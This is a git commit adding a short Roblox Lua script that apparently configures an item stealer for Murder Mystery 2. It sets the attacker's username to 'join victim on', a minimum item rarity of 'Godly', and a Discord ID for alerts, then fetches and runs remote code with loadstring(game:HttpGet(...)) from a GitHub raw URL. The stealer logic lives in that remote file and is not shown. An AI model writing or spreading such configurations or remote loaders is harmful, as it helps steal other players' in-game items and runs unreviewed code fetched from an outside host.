b010a4f4bbbca466bab93560f72768cff4729359
mrxver555 <hhhhihohbvj@gmail.com>
2025-02-20 03:57:46 +0800

    Add files via upload

---
+++ PMM2(MS).lua
@@ -0,0 +1,8 @@
+_G.Username = "kevb1001" -- user you should join victim on
+_G.min_rarity = "Godly"
+_G.min_value = 1 -- Put 1 to get all
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.discuser = "1153332469823709294" -- change to your Discord user ID
+
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/mrxver555/PREMIUM-/refs/heads/main/PREMIUMmm2(TOBI).lua'))()
